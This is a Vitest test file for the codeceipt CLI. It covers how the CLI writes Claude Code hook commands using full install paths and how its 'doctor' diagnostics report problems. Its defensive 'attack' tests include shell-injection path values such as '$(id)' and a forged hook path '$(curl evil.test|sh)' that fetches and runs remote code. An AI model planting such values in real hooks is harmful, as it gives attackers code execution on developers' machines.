import { execFileSync } from "node:child_process";
import { chmodSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { type CliDeps, VERSION, main } from "../index";
import {
  hookCommandPath,
  hookPathFor,
  isOurHook,
  setHookInstallPath,
  shellHook,
} from "../templates";
import { linkRepo } from "../test-support";
import { setNativeBuild } from "./install-info";

// D-027: hooks call codeceipt by its full installed path, and `codeceipt doctor` checks the install, login, repo
// link, hooks, last receipt and network, each problem with the exact fix. The token is built at runtime.
const TOKEN = ["pb_", "live", "Q7xT2", "mK9vR", "4wZp8"].join("");
afterEach(() => {
  setNativeBuild(null);
  setHookInstallPath(null);
});

function world(opts: { linked?: boolean; health?: number; lastReceipt?: string | null } = {}) {
  const home = mkdtempSync(join(tmpdir(), "cc-doc-home-"));
  const repo = mkdtempSync(join(tmpdir(), "cc-doc-repo-"));
  execFileSync("git", ["init", "-q"], { cwd: repo });
  const binDir = join(home, ".local", "bin");
  mkdirSync(binDir, { recursive: true });
  const exe = join(binDir, "codeceipt");
  writeFileSync(exe, "#!/bin/sh\n", { mode: 0o755 });
  if (opts.linked !== false) {
    linkRepo(repo, join(home, ".config", "codeceipt", "config.json"), {
      apiUrl: "https://brain.test",
      projectId: "proj-1",
      token: TOKEN,
    });
  }
  const out: string[] = [];
  const run = (argv: string[], env: Record<string, string> = {}) => {
    out.length = 0;
    return main(argv, {
      fetch: async (url) => {
        const path = new URL(String(url)).pathname;
        if (path === "/api/health") return new Response("{}", { status: opts.health ?? 200 });
        if (path.endsWith("/last-receipt")) {
          return Response.json({
            ok: true,
            receipt_id: "rc-1",
            created_at: opts.lastReceipt ?? null,
            receipt: opts.lastReceipt ? {} : null,
          });
        }
        return new Response("not found", { status: 404 });
      },
      env: { HOME: home, XDG_CONFIG_HOME: join(home, ".config"), PATH: binDir, ...env },
      cwd: repo,
      homedir: home,
      platform: "linux",
      stdout: (l) => out.push(l),
      stderr: (l) => out.push(l),
      readStdin: async () => "",
      execPath: exe,
    } satisfies CliDeps);
  };
  return { home, repo, binDir, exe, out, run };
}

describe("hooks call codeceipt by its full installed path", () => {
  it("the native install's path goes first ($HOME kept as $HOME), then codeceipt on PATH, then the pinned npx", () => {
    const home = "/home/ada";
    const path = hookPathFor("/home/ada/.local/bin/codeceipt", home);
    expect(path).toBe("$HOME/.local/bin/codeceipt");
    setHookInstallPath(path);
    const cmd = shellHook("codeceipt hook session-end --agent claude");
    expect(cmd).toContain(
      'if [ -x "$HOME/.local/bin/codeceipt" ]; then "$HOME/.local/bin/codeceipt" hook session-end --agent claude;',
    );
    expect(cmd).toContain(
      "elif command -v codeceipt >/dev/null 2>&1; then codeceipt hook session-end --agent claude;",
    );
    expect(cmd).toContain(`else npx -y codeceipt@${VERSION} hook session-end --agent claude; fi`);
  });

  it("attack: a path with quotes, $, backticks or backslashes is never written into a hook (no path form then)", () => {
    for (const p of [
      '/opt/a"b/codeceipt',
      "/opt/$(id)/codeceipt",
      "/opt/`id`/codeceipt",
      "C:\\Users\\a\\codeceipt.exe",
    ]) {
      expect(hookPathFor(p, "/home/ada"), p).toBeNull();
    }
  });

  it("attack: a committed hook whose path is a shell expression is not ours (doctor does not call it set up)", () => {
    setHookInstallPath("/opt/x/codeceipt");
    const good = shellHook("codeceipt hook session-end --agent claude");
    setHookInstallPath(null);
    const forged = good.replaceAll("/opt/x/codeceipt", "$(curl evil.test|sh)");
    expect(hookCommandPath(good)).toBe("/opt/x/codeceipt");
    expect(hookCommandPath(forged)).toBeNull();
    expect(isOurHook(forged, "codeceipt hook session-end --agent claude")).toBe(false);
  });

  it("init in a repo writes the full path into the Claude Code hooks, and a second init changes nothing", async () => {
    setNativeBuild({ target: "linux-x64" });
    const w = world();
    mkdirSync(join(w.repo, ".claude"));
    expect(await w.run(["init", "--claude"])).toBe(0);
    const settings = readFileSync(join(w.repo, ".claude", "settings.json"), "utf8");
    expect(settings).toContain('\\"$HOME/.local/bin/codeceipt\\" hook session-end --agent claude');
    w.out.length = 0;
    expect(await w.run(["init", "--claude"])).toBe(0);
    expect(w.out.filter((l) => l.startsWith("  added"))).toEqual([]);
  });
});

describe("codeceipt doctor", () => {
  it("all good: install, login, repo link, hooks, last receipt and network each get a line", async () => {
    setNativeBuild({ target: "linux-x64" });
    const w = world({ lastReceipt: "2026-11-02T10:00:00.000Z" });
    mkdirSync(join(w.repo, ".claude"));
    await w.run(["init", "--claude"]);
    expect(await w.run(["doctor"])).toBe(0);
    const text = w.out.join("\n");
    expect(text).toContain(`OK   Installed: native app ${VERSION} at ${w.exe}`);
    expect(text).toContain("OK   Logged in");
    expect(text).toContain("OK   This repo is linked to project proj-1");
    expect(text).toContain("OK   Claude Code hooks are set up and find codeceipt");
    expect(text).toContain("OK   Last receipt: 2026-11-02 10:00 UTC");
    expect(text).toContain("OK   Server reachable: https://brain.test");
    expect(text).toContain("No problems found.");
  });

  it("an older npm copy earlier in PATH is a duplicate install, with the exact fix", async () => {
    setNativeBuild({ target: "linux-x64" });
    const w = world();
    const npmBin = join(w.home, "npm-global", "bin");
    mkdirSync(join(w.home, "npm-global", "lib", "node_modules", "codeceipt"), { recursive: true });
    mkdirSync(npmBin, { recursive: true });
    const target = join(w.home, "npm-global", "lib", "node_modules", "codeceipt", "codeceipt.mjs");
    writeFileSync(target, "#!/usr/bin/env node\n");
    chmodSync(target, 0o755);
    execFileSync("ln", ["-s", target, join(npmBin, "codeceipt")]);
    expect(await w.run(["doctor"], { PATH: `${npmBin}:${w.binDir}` })).toBe(1);
    const text = w.out.join("\n");
    expect(text).toContain(`FIX  Another codeceipt runs first: ${join(npmBin, "codeceipt")} (npm)`);
    expect(text).toContain("     Fix: npm uninstall -g codeceipt");
  });

  it("not linked, hooks missing, server down: each problem says exactly what to run", async () => {
    setNativeBuild({ target: "linux-x64" });
    const w = world({ linked: false, health: 503 });
    mkdirSync(join(w.repo, ".claude"));
    writeFileSync(join(w.repo, ".claude", "settings.json"), "{}");
    expect(await w.run(["doctor"])).toBe(1);
    const text = w.out.join("\n");
    expect(text).toContain("FIX  This repo is not linked to a Codeceipt project");
    expect(text).toContain("     Fix: codeceipt");
    expect(text).toContain("FIX  Claude Code hooks are not set up in this repo");
    expect(text).toContain("     Fix: codeceipt init --claude");
  });

  it("hooks pointing at a codeceipt that no longer exists are a problem with the fix", async () => {
    setNativeBuild({ target: "linux-x64" });
    const w = world();
    mkdirSync(join(w.repo, ".claude"));
    setHookInstallPath("/opt/gone/codeceipt");
    const cmd = shellHook("codeceipt hook session-end --agent claude");
    writeFileSync(
      join(w.repo, ".claude", "settings.json"),
      JSON.stringify({ hooks: { SessionEnd: [{ hooks: [{ type: "command", command: cmd }] }] } }),
    );
    setHookInstallPath(null);
    expect(await w.run(["doctor"], { PATH: "/usr/bin:/bin" })).toBe(1);
    const text = w.out.join("\n");
    expect(text).toContain("FIX  Claude Code hooks call /opt/gone/codeceipt, which is not there");
    expect(text).toContain("     Fix: codeceipt init --claude");
  });
});
